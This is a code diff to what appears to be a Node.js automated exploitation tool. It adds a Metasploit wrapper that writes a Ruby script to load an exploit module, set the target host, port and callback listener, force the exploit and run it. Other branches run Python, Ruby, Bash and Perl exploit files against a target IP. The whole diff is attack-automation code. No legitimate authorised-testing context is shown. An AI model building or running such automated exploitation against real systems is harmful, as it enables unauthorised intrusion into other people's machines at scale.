@@ -700,7 +700,54 @@ except:
                         logger.info(`Executing exploit ${exploit.id} (${exploitData.language}) for ${targetIp}:${targetPort} [Confidence: ${exploit.match_confidence || 'N/A'}%]`);
 
                         let cmd = '';
-                        if (exploitData.language === 'python') cmd = `python3 "${tempFile}"`;
+                        // Metasploit Execution Wrapper
+                        if (exploit.source === 'metasploit' || (exploitData.language === 'ruby' && exploitData.code.includes('Msf::'))) {
+                            const msfRoot = path.join(__dirname, '..', 'data', 'metasploit');
+                            const wrapperContent = `
+$LOAD_PATH.unshift(File.join('${msfRoot}', 'lib'))
+begin
+  require 'msf/core'
+rescue LoadError
+  puts "Error: Metasploit libraries not found. Ensure gems are installed."
+  exit 1
+end
+
+# Load the module
+module_path = '${exploitData.filePath}'
+require module_path
+
+# Instantiate
+klass = ObjectSpace.each_object(Class).find { |c| c < Msf::Exploit || c < Msf::Auxiliary }
+if klass
+  instance = klass.new
+  # Minimal framework mock/stub if full framework not available
+  # In a real setup, we would need Msf::Simple::Framework.create
+  # but that requires DB connection etc.
+  # We try to run it standalone if possible, or attempt framework create.
+  begin
+    instance.framework = Msf::Simple::Framework.create(:module_types => [])
+  rescue
+    # Fallback or fail
+  end
+
+  # Set Datastore
+  instance.datastore['RHOSTS'] = '${targetIp}'
+  instance.datastore['RPORT'] = '${targetPort || 80}'
+  ${lhost ? `instance.datastore['LHOST'] = '${lhost}'` : ''}
+  ${lport ? `instance.datastore['LPORT'] = '${lport}'` : ''}
+  instance.datastore['ForceExploit'] = true
+
+  puts "Running #{instance.name}..."
+  instance.exploit
+else
+  puts "Module class not found"
+end
+`;
+                            const wrapperFile = path.join(tmpDir, 'msf_wrapper.rb');
+                            fs.writeFileSync(wrapperFile, wrapperContent);
+                            cmd = `ruby "${wrapperFile}"`;
+                        }
+                        else if (exploitData.language === 'python') cmd = `python3 "${tempFile}"`;
                         else if (exploitData.language === 'ruby') cmd = `ruby "${tempFile}"`;
                         else if (exploitData.language === 'bash') cmd = `bash "${tempFile}"`;
                         else if (exploitData.language === 'perl') cmd = `perl "${tempFile}"`;
